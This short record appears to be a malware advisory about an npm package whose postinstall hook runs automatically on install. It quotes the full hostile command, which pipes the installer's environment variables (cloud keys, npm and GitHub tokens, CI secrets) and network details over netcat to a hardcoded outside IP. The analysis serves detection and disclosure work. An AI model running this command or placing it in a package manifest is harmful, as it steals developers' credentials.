  "summary": "postinstall exfiltrates environment variables and network config to hardcoded bare IP",
  "details": "package.json declares a postinstall lifecycle script `(env; ip addr) | nc 49.13.60.225 888` that runs automatically on `npm install`. The command dumps the installer's entire process environment (routinely containing credentials such as AWS_SECRET_ACCESS_KEY, NPM_TOKEN, GITHUB_TOKEN, and CI secrets) along with local network interface information and pipes the output over netcat in cleartext to the hardcoded bare IP 49.13.60.225 on port 888. The shipped source at src/plugin.ts is empty; the manifest's lifecycle hook is the entire payload.",
